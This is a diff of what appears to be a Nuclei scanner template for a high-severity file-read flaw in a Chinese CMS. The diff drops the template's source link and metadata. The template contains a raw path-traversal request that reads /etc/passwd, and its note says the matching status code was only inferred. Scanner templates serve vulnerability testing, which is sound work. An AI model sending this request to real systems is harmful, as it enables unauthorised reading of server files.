@@ -3,13 +3,8 @@ info:
   name: 龙卷风科技 cms 存在文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vh8wx8gcgw086tru
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vh8wx8gcgw086tru
 http:
 - raw:
   - GET /api/../fetch?filename=/../../../../../etc/passwd HTTP/1.1
